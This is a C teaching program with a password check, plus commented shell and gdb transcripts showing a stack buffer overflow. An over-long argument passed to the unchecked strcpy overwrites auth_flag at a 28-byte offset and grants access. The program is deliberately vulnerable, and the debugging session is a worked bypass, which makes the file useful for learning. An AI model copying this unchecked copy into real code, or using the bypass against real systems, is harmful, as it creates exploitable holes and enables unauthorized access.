#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int check_authentication(char *password) {
    int auth_flag = 0;
    char password_buffer[16];
    strcpy(password_buffer, password);
    if(strcmp(password_buffer, "brillig") == 0)
        auth_flag = 1;
    if(strcmp(password_buffer, "outgrabe") == 0)
        auth_flag = 1;
    return auth_flag;
}
int main(int argc, char *argv[]) {
    if(argc < 2) {
        printf("Usage: %s <password>\n", argv[0]);
        exit(0);
    }
    if(check_authentication(argv[1])) {
        printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
        printf(" Access Granted.\n");
        printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
    } else {
        printf("\nAccess Denied.\n");
    }
}

/* └─$ ./a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

-=-=-=-=-=-=-=-=-=-=-=-=-=-
 Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
zsh: segmentation fault  ./a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA */

/* └─$ gdb -q ./a.out                                                                                   139 ⨯
Reading symbols from ./a.out...
(gdb) list 1
warning: Source file is more recent than executable.
1       #include <stdio.h>
2       #include <stdlib.h>
3       #include <string.h>
4       int check_authentication(char *password) {
5           int auth_flag = 0;
6           char password_buffer[16];
7           strcpy(password_buffer, password);
8           if(strcmp(password_buffer, "brillig") == 0)
9               auth_flag = 1;
10          if(strcmp(password_buffer, "outgrabe") == 0)
(gdb) 
11              auth_flag = 1;
12          return auth_flag;
13      }
14      int main(int argc, char *argv[]) {
15          if(argc < 2) {
16              printf("Usage: %s <password>\n", argv[0]);
17              exit(0);
18          }
19          if(check_authentication(argv[1])) {
20              printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
(gdb) 
21              printf(" Access Granted.\n");
22              printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
23          } else {
24              printf("\nAccess Denied.\n");
25          }
26      }
27
28      /* └─$ ./a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
29
30      -=-=-=-=-=-=-=-=-=-=-=-=-=-
(gdb) break 7
Breakpoint 1 at 0x118c: file 41.auth_overflow.c, line 7.
(gdb) break 12
Breakpoint 2 at 0x11e1: file 41.auth_overflow.c, line 12.
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/omit/Projects/Code/C/a.out AAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, check_authentication (password=0x7fffffffe0fe 'A' <repeats 25 times>)
    at 41.auth_overflow.c:7
7           strcpy(password_buffer, password);
(gdb) x/s password_buffer
0x7fffffffdbd0: ""
(gdb) x/x &auth_flag
0x7fffffffdbec: 0x00
(gdb) print 0x7fffffffdbec - 0x7fffffffdbd0
$1 = 28
(gdb) x/16xw password_buffer
0x7fffffffdbd0: 0x00000000      0x00000000      0x555552c5      0x00005555
0x7fffffffdbe0: 0x00000000      0x00000000      0x55555280      0x00000000
0x7fffffffdbf0: 0xffffdc10      0x00007fff      0x55555236      0x00005555
0x7fffffffdc00: 0xffffdd08      0x00007fff      0x00000000      0x00000002
(gdb) continue
Continuing.

Breakpoint 2, check_authentication (password=0x7fffffffe0fe 'A' <repeats 25 times>)
    at 41.auth_overflow.c:12
12          return auth_flag;
(gdb) x/s password_buffer
0x7fffffffdbd0: 'A' <repeats 25 times>
(gdb) x/x &auth_flag
0x7fffffffdbec: 0x00
(gdb) x/16xw password_buffer
0x7fffffffdbd0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdbe0: 0x41414141      0x41414141      0x55550041      0x00000000
0x7fffffffdbf0: 0xffffdc10      0x00007fff      0x55555236      0x00005555
0x7fffffffdc00: 0xffffdd08      0x00007fff      0x00000000      0x00000002
(gdb) x/4cb &auth_flag
0x7fffffffdbec: 0 '\000'        0 '\000'        0 '\000'        0 '\000'
(gdb) x/dw &auth_flag
0x7fffffffdbec: 0
(gdb) continue
Continuing.

Access Denied.
[Inferior 1 (process 2093032) exited normally]
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/omit/Projects/Code/C/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, check_authentication (password=0x7fffffffe0f6 'A' <repeats 33 times>)
    at 41.auth_overflow.c:7
7           strcpy(password_buffer, password);
(gdb) x/s password_buffer
0x7fffffffdbd0: ""
(gdb) x/x &auth_flag
0x7fffffffdbec: 0x00
(gdb) print 0x7fffffffdbec - 0x7fffffffdbd0
$2 = 28
(gdb) x/16xw password_buffer
0x7fffffffdbd0: 0x00000000      0x00000000      0x555552c5      0x00005555
0x7fffffffdbe0: 0x00000000      0x00000000      0x55555280      0x00000000
0x7fffffffdbf0: 0xffffdc10      0x00007fff      0x55555236      0x00005555
0x7fffffffdc00: 0xffffdd08      0x00007fff      0x00000000      0x00000002
(gdb) continue
Continuing.

Breakpoint 2, check_authentication (password=0x7fffffffe0f6 'A' <repeats 33 times>)
    at 41.auth_overflow.c:12
12          return auth_flag;
(gdb) x/s password_buffer
0x7fffffffdbd0: 'A' <repeats 33 times>
(gdb) x/x &auth_flag
0x7fffffffdbec: 0x41
(gdb) x/16xw password_buffer
0x7fffffffdbd0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdbe0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdbf0: 0xffff0041      0x00007fff      0x55555236      0x00005555
0x7fffffffdc00: 0xffffdd08      0x00007fff      0x00000000      0x00000002
(gdb) x/4cb &auth_flag
0x7fffffffdbec: 65 'A'  65 'A'  65 'A'  65 'A'
(gdb) x/dw &auth_flag
0x7fffffffdbec: 1094795585
(gdb) continue
Continuing.

-=-=-=-=-=-=-=-=-=-=-=-=-=-
 Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb)  */